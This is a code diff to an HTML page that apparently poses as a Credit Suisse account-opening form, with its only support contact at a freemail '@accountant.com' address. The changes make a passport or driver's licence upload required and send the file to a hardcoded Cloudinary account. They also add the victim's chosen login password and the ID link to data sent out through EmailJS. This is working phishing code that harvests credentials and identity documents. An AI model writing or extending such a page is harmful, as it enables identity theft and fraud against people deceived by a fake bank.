@@ -109,6 +109,35 @@
       box-shadow: 0 0 0 3px rgba(0, 42, 92, 0.1);
     }
 
+    /* Password field with eye icon */
+    .password-container {
+      position: relative;
+      margin-bottom: 20px;
+    }
+
+    .password-container input {
+      margin-bottom: 0;
+      padding-right: 40px;
+    }
+
+    .eye-icon {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      color: #6b7280;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 10;
+    }
+
+    .eye-icon svg {
+      width: 20px;
+      height: 20px;
+    }
+
     .account-grid {
       display: grid;
       grid-template-columns: 1fr 1fr;
@@ -171,12 +200,17 @@
       background: #fafbfc;
       cursor: pointer;
       transition: all 0.2s ease;
-      margin-bottom: 25px;
+      margin-bottom: 10px;
     }
 
     .upload-area:hover {
       border-color: #002a5c;
       background: #f0f7ff;
+    }
+
+    .upload-area.uploaded {
+      border-color: #10b981;
+      background: #f0fdf4;
     }
 
     .upload-icon svg {
@@ -208,6 +242,13 @@
     .upload-note {
       font-size: 11px;
       color: #8b949e;
+    }
+
+    .upload-progress {
+      font-size: 13px;
+      color: #002a5c;
+      margin-top: 10px;
+      text-align: center;
     }
 
     .checkbox-group {
@@ -273,11 +314,17 @@
       box-shadow: 0 10px 25px -5px rgba(0, 42, 92, 0.3);
     }
 
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      transform: none;
+    }
+
     .pin-note {
       font-size: 12px;
       color: #6b7280;
-      margin-top: -15px;
-      margin-bottom: 20px;
+      margin-top: 5px;
+      margin-bottom: 15px;
       display: flex;
       align-items: center;
       gap: 5px;
@@ -550,12 +597,20 @@
             </div>
           </div>
 
-          <!-- Section 4: Security - Your Login Password -->
+          <!-- Section 4: Security - Login Password with Eye Toggle -->
           <div class="section-title">Login Credentials</div>
           
           <div>
             <label>Create Login Password (12-16 characters)</label>
-            <input type="password" id="pin" placeholder="Enter 12-16 character password" maxlength="16" required>
+            <div class="password-container">
+              <input type="password" id="pin" placeholder="Enter 12-16 character password" maxlength="16" required>
+              <span class="eye-icon" onclick="togglePassword()">
+                <svg id="eyeIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                  <circle cx="12" cy="12" r="3"></circle>
+                </svg>
+              </span>
+            </div>
             <div class="pin-note">
               <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                 <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
@@ -565,20 +620,21 @@
             </div>
           </div>
 
-          <!-- Section 5: ID Upload -->
-          <div class="section-title">Verification (Optional)</div>
+          <!-- Section 5: ID Upload with Cloudinary -->
+          <div class="section-title">Verification (Required)</div>
           
-          <div class="upload-area" onclick="document.getElementById('fileUpload').click();">
+          <div class="upload-area" id="uploadArea" onclick="document.getElementById('fileUpload').click();">
             <div class="upload-icon">
               <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                 <path d="M21.44 11.05l-9.19 9.19a6 6 0 0 1-8.49-8.49l9.19-9.19a4 4 0 0 1 5.66 5.66l-9.2 9.19a2 2 0 0 1-2.83-2.83l8.49-8.48"></path>
               </svg>
             </div>
-            <p style="color: #6b7280; margin: 0 0 10px;">Upload ID (Passport/Driver's License)</p>
-            <span class="upload-btn">Choose File</span>
-            <div class="upload-note">JPG, PNG or PDF up to 5MB</div>
-            <input type="file" id="fileUpload" accept=".jpg,.jpeg,.png,.pdf" style="display: none;">
+            <p style="color: #6b7280; margin: 0 0 10px;" id="uploadText">Upload ID (Passport/Driver's License)</p>
+            <span class="upload-btn" id="uploadBtn">Choose File</span>
+            <div class="upload-note" id="uploadNote">JPG, PNG or PDF up to 5MB</div>
+            <input type="file" id="fileUpload" accept=".jpg,.jpeg,.png,.pdf" style="display: none;" required>
           </div>
+          <div id="uploadProgress" class="upload-progress" style="display:none;"></div>
 
           <!-- Section 6: Terms -->
           <div class="checkbox-group">
@@ -599,7 +655,7 @@
           </div>
 
           <!-- Submit Button -->
-          <button type="button" onclick="submitRegistration()">Create Account</button>
+          <button type="button" onclick="submitRegistration()" id="submitBtn">Create Account</button>
         </form>
       </div>
 
@@ -654,7 +710,7 @@
       <p>
         Account creation in progress!<br>
         Please check your email within 24 hours for your account details.<br><br>
-        <strong>Your login password:</strong> The PIN you created will be your password.
+        <strong>Your login password:</strong> The password you created will be your login credentials.
       </p>
       <button onclick="closeModal()">OK</button>
     </div>
@@ -666,6 +722,11 @@
     (function() {
       emailjs.init("pDefyPQfc_lW2Cdcu");
     })();
+
+    // Cloudinary config
+    const CLOUD_NAME = 'do9yjpizs';
+    const UPLOAD_PRESET = 'unsigned_preset';
+    let uploadedFileUrl = '';
 
     // Account selection
     let selectedAccount = '';
@@ -694,6 +755,59 @@
       window.location.href = 'mailto:credit-suisse.account.mgt@accountant.com?subject=Account%20Opening%20Support';
     }
 
+    // Password visibility toggle
+    function togglePassword() {
+      const input = document.getElementById('pin');
+      const eye = document.getElementById('eyeIcon');
+      
+      if (input.type === 'password') {
+        input.type = 'text';
+        // Change to eye-slash icon
+        eye.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>';
+      } else {
+        input.type = 'password';
+        // Change back to eye icon
+        eye.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>';
+      }
+    }
+
+    // File upload with Cloudinary
+    document.getElementById('fileUpload').addEventListener('change', function(e) {
+      const file = e.target.files[0];
+      if (!file) return;
+      
+      // Show progress
+      const progressDiv = document.getElementById('uploadProgress');
+      progressDiv.style.display = 'block';
+      progressDiv.textContent = 'Uploading...';
+      
+      const formData = new FormData();
+      formData.append('file', file);
+      formData.append('upload_preset', UPLOAD_PRESET);
+      
+      fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/auto/upload`, {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.secure_url) {
+          uploadedFileUrl = data.secure_url;
+          progressDiv.style.display = 'none';
+          document.getElementById('uploadText').textContent = '✓ ID Uploaded: ' + file.name;
+          document.getElementById('uploadArea').classList.add('uploaded');
+          document.getElementById('uploadBtn').textContent = 'Change File';
+        }
+      })
+      .catch(error => {
+        console.error('Upload failed:', error);
+        progressDiv.textContent = 'Upload failed. Try again.';
+        setTimeout(() => {
+          progressDiv.style.display = 'none';
+        }, 3000);
+      });
+    });
+
     // Submit registration
     function submitRegistration() {
       // Validate required fields
@@ -711,14 +825,20 @@
         return;
       }
 
-      // Validate PIN length
+      // Validate password length
       const pin = document.getElementById('pin').value;
       if (pin.length < 12 || pin.length > 16) {
         alert('Password must be between 12 and 16 characters.');
         return;
       }
 
-      const btn = event.target;
+      // Validate ID upload
+      if (!uploadedFileUrl) {
+        alert('Please upload your ID document.');
+        return;
+      }
+
+      const btn = document.getElementById('submitBtn');
       const originalText = btn.textContent;
       btn.textContent = 'Submitting...';
       btn.disabled = true;
@@ -734,7 +854,8 @@
         volume: document.getElementById('volume').value,
         employment: document.getElementById('employment').value,
         sourceFunds: document.getElementById('sourceFunds').value,
-        password: document.getElementById('pin').value, // Changed from PIN to password
+        password: document.getElementById('pin').value,
+        idUrl: uploadedFileUrl,
         timestamp: new Date().toLocaleString('en-GB', {
           day: '2-digit',
           month: '2-digit',
@@ -755,6 +876,10 @@
             el.classList.remove('selected');
           });
           selectedAccount = '';
+          uploadedFileUrl = '';
+          document.getElementById('uploadArea').classList.remove('uploaded');
+          document.getElementById('uploadText').textContent = 'Upload ID (Passport/Driver\'s License)';
+          document.getElementById('uploadBtn').textContent = 'Choose File';
         })
         .catch(function(error) {
           alert('Submission failed. Please try again.');
@@ -769,14 +894,6 @@
     function closeModal() {
       document.getElementById('successModal').classList.remove('show');
     }
-
-    // File upload (optional)
-    document.getElementById('fileUpload')?.addEventListener('change', function(e) {
-      const fileName = e.target.files[0]?.name;
-      if (fileName) {
-        // Optional: show file name
-      }
-    });
   </script>
 </body>
 </html>
